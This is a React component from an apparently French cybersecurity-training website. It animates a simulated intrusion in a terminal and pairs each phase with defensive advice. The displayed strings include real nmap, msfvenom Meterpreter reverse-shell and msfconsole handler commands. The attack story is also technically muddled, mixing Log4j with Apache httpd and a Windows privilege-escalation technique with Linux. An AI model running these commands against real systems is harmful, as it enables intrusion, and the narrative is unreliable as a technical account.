"use client"

import { useState } from "react"
import { motion } from "framer-motion"
import { Shield, Lock, Unlock, AlertTriangle } from "lucide-react"

import { Button } from "@/components/ui/button"
import { SectionTitle } from "@/components/atoms/section-title"
import { HackerEffect } from "@/components/animations/hacker-effect"
import { TerminalEffect } from "@/components/animations/terminal-effect"
import { GlitchText } from "@/components/animations/glitch-text"

export function HackerDemoSection() {
  const [hackingStage, setHackingStage] = useState<"idle" | "scanning" | "exploiting" | "accessing" | "complete">(
    "idle",
  )

  const startHacking = () => {
    if (hackingStage !== "idle") return
    setHackingStage("scanning")
  }

  const hackingCommands = {
    scanning: [
      "nmap -sS -sV -p- 192.168.1.1",
      "PORT     STATE SERVICE     VERSION",
      "22/tcp   open  ssh         OpenSSH 7.6p1",
      "80/tcp   open  http        Apache httpd 2.4.29",
      "443/tcp  open  ssl/https   Apache httpd 2.4.29",
      "8080/tcp open  http-proxy  Squid http proxy 3.5.27",
      "Scanning complete. Vulnerabilities detected.",
      "Initiating exploit sequence...",
    ],
    exploiting: [
      "searchsploit Apache 2.4.29",
      "Exploiting CVE-2021-44228 Log4j vulnerability...",
      "Generating payload...",
      "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > payload.elf",
      "Starting handler...",
      'msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; run"',
      "Sending exploit...",
      "[+] Exploit successful!",
      "[+] Meterpreter session 1 opened",
      "Escalating privileges...",
    ],
    accessing: [
      "meterpreter > getuid",
      "Server username: www-data",
      "meterpreter > getsystem",
      "...got system via technique 1 (Named Pipe Impersonation).",
      "meterpreter > shell",
      "Process 1234 created.",
      "Channel 1 created.",
      "# whoami",
      "root",
      "# cd /root",
      "# ls -la",
      "total 32",
      "drwx------  4 root root 4096 Apr 10 15:30 .",
      "drwxr-xr-x 23 root root 4096 Apr  8 12:15 ..",
      "-rw-------  1 root root  485 Apr 10 14:22 .bash_history",
      "-rw-r--r--  1 root root 3106 Apr  9 17:52 .bashrc",
      "-rw-r--r--  1 root root  161 Apr  9 17:52 .profile",
      "-rw-------  1 root root 1024 Apr 10 15:30 secret_data.enc",
      "# cat secret_data.enc | openssl enc -d -aes-256-cbc -a",
      "Enter decryption password:",
      "********",
      "ACCESS GRANTED. System compromised.",
    ],
  }

  const handleTerminalComplete = (stage: "scanning" | "exploiting" | "accessing") => {
    if (stage === "scanning") {
      setHackingStage("exploiting")
    } else if (stage === "exploiting") {
      setHackingStage("accessing")
    } else if (stage === "accessing") {
      setHackingStage("complete")
    }
  }

  return (
    <section className="w-full py-12 md:py-24 lg:py-32 bg-black relative overflow-hidden">
      {/* Background hacker effect */}
      <div className="absolute inset-0 opacity-30">
        <HackerEffect fullScreen={false} intensity="low" />
      </div>

      <div className="container px-4 md:px-6 relative z-10">
        <SectionTitle
          title={
            <GlitchText text="Démonstration de cybersécurité" glitchIntensity="medium" color="#00DC82" as="span" />
          }
          subtitle="Visualisez les techniques utilisées par les hackers et apprenez à vous en protéger"
          light
        />

        <div className="mt-12 grid grid-cols-1 lg:grid-cols-2 gap-8">
          {/* Left side - Terminal */}
          <div className="relative">
            <motion.div
              className="absolute -inset-1 bg-primary/20 rounded-lg blur-md"
              animate={{
                opacity: [0.2, 0.4, 0.2],
              }}
              transition={{
                duration: 4,
                repeat: Number.POSITIVE_INFINITY,
                repeatType: "reverse",
              }}
            />

            <div className="relative bg-black border border-primary/30 rounded-lg overflow-hidden">
              {/* Terminal header */}
              <div className="flex items-center justify-between bg-gray-900 px-4 py-2 border-b border-primary/30">
                <div className="flex items-center gap-2">
                  <div className="w-3 h-3 rounded-full bg-red-500"></div>
                  <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
                  <div className="w-3 h-3 rounded-full bg-green-500"></div>
                </div>
                <div className="text-xs text-gray-400">terminal@kali:~</div>
                <div className="w-4"></div>
              </div>

              {/* Terminal content */}
              <div className="h-[400px] overflow-auto p-4">
                {hackingStage === "idle" && (
                  <div className="flex flex-col items-center justify-center h-full">
                    <Shield className="h-16 w-16 text-primary mb-4" />
                    <p className="text-primary text-center mb-6">
                      Système sécurisé. Cliquez sur le bouton pour simuler une attaque.
                    </p>
                    <Button
                      onClick={startHacking}
                      variant="outline"
                      className="border-primary text-primary hover:text-primary hover:bg-primary/10"
                    >
                      Lancer la simulation d'attaque
                    </Button>
                  </div>
                )}

                {hackingStage === "scanning" && (
                  <TerminalEffect
                    text={hackingCommands.scanning}
                    typingSpeed={30}
                    onComplete={() => handleTerminalComplete("scanning")}
                  />
                )}

                {hackingStage === "exploiting" && (
                  <TerminalEffect
                    text={hackingCommands.exploiting}
                    typingSpeed={30}
                    onComplete={() => handleTerminalComplete("exploiting")}
                  />
                )}

                {hackingStage === "accessing" && (
                  <TerminalEffect
                    text={hackingCommands.accessing}
                    typingSpeed={30}
                    onComplete={() => handleTerminalComplete("accessing")}
                  />
                )}

                {hackingStage === "complete" && (
                  <div className="flex flex-col items-center justify-center h-full">
                    <AlertTriangle className="h-16 w-16 text-red-500 mb-4" />
                    <GlitchText
                      text="SYSTÈME COMPROMIS"
                      className="text-red-500 text-2xl font-bold mb-4"
                      glitchIntensity="high"
                      color="#ff0000"
                    />
                    <p className="text-primary text-center mb-6">
                      Cette démonstration illustre comment un attaquant peut exploiter des vulnérabilités pour
                      compromettre un système.
                    </p>
                    <Button
                      onClick={() => setHackingStage("idle")}
                      variant="outline"
                      className="border-primary text-primary hover:bg-primary/10"
                    >
                      Réinitialiser la démonstration
                    </Button>
                  </div>
                )}
              </div>
            </div>
          </div>

          {/* Right side - Explanation */}
          <div className="space-y-6">
            <motion.div
              className="bg-black/80 backdrop-blur-sm border border-primary/30 rounded-lg p-6"
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              transition={{ duration: 0.5 }}
            >
              <h3 className="text-xl font-bold text-white mb-4 flex items-center gap-2">
                {hackingStage === "idle" || hackingStage === "scanning" ? (
                  <Lock className="h-5 w-5 text-primary" />
                ) : (
                  <Unlock className="h-5 w-5 text-red-500" />
                )}
                <span>
                  {hackingStage === "idle" && "Prêt pour la démonstration"}
                  {hackingStage === "scanning" && "Phase 1: Reconnaissance"}
                  {hackingStage === "exploiting" && "Phase 2: Exploitation"}
                  {hackingStage === "accessing" && "Phase 3: Accès et élévation de privilèges"}
                  {hackingStage === "complete" && "Système compromis"}
                </span>
              </h3>

              <p className="text-gray-300 mb-4">
                {hackingStage === "idle" &&
                  "Cette démonstration simule une attaque informatique typique pour vous montrer comment les cybercriminels opèrent et comment vous pouvez vous protéger."}
                {hackingStage === "scanning" &&
                  "L'attaquant commence par scanner le réseau pour identifier les services en cours d'exécution et leurs versions. Cette étape permet de découvrir des vulnérabilités potentielles."}
                {hackingStage === "exploiting" &&
                  "Une fois les vulnérabilités identifiées, l'attaquant utilise des exploits spécifiques pour compromettre le système. Ici, une vulnérabilité Log4j est exploitée pour obtenir un accès initial."}
                {hackingStage === "accessing" &&
                  "Après avoir obtenu un accès initial, l'attaquant tente d'élever ses privilèges pour obtenir un contrôle total du système et accéder aux données sensibles."}
                {hackingStage === "complete" &&
                  "L'attaque est réussie. L'attaquant a maintenant un accès complet au système et peut voler des données, installer des logiciels malveillants ou utiliser le système comme point d'entrée vers d'autres systèmes du réseau."}
              </p>

              <div className="mt-6">
                <h4 className="text-lg font-semibold text-white mb-2">Comment se protéger:</h4>
                <ul className="space-y-2 text-gray-300">
                  <li className="flex items-start gap-2">
                    <Shield className="h-5 w-5 text-primary flex-shrink-0 mt-0.5" />
                    <span>
                      Maintenir tous les logiciels et systèmes à jour avec les derniers correctifs de sécurité
                    </span>
                  </li>
                  <li className="flex items-start gap-2">
                    <Shield className="h-5 w-5 text-primary flex-shrink-0 mt-0.5" />
                    <span>Utiliser des mots de passe forts et l'authentification à deux facteurs</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <Shield className="h-5 w-5 text-primary flex-shrink-0 mt-0.5" />
                    <span>
                      Mettre en place un système de détection d'intrusion et surveiller régulièrement les logs
                    </span>
                  </li>
                </ul>
              </div>
            </motion.div>

            <motion.div
              className="bg-gradient-to-r from-primary/20 to-primary/5 backdrop-blur-sm rounded-lg p-6"
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              transition={{ duration: 0.5, delay: 0.2 }}
            >
              <h3 className="text-xl font-bold text-white mb-2">Apprenez à vous défendre</h3>
              <p className="text-gray-300">
                Notre formation en cybersécurité vous apprend à identifier ces techniques d'attaque et à mettre en place
                des défenses efficaces pour protéger vos systèmes et données.
              </p>
              <Button className="mt-4 bg-primary hover:bg-primary/90 text-black">Découvrir notre programme</Button>
            </motion.div>
          </div>
        </div>
      </div>
    </section>
  )
}
